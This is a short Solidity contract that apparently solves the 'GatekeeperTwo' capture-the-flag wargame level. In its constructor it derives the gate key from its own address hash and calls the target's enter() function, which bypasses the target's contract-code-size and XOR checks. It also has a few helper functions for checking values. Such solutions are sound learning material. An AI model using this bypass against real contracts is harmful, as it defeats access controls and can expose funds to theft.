// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.6.3;

interface GatekeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract Level14 {
    GatekeeperTwo gateKeeper;

    constructor(GatekeeperTwo _gateKeeper) public {
        gateKeeper = _gateKeeper;
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        _gateKeeper.enter(key);
    }


    function func1() view public returns (bytes memory) {
        return abi.encodePacked(msg.sender);
    }

    function func2() view public returns (bytes32) {
        return keccak256(abi.encodePacked(msg.sender));
    }

    function func3() view public returns (bytes8) {
        return bytes8(keccak256(abi.encodePacked(msg.sender)));
    }
    function func4(bytes8 _gateKey) view public returns (uint64) {
        return uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) ;
    }
}
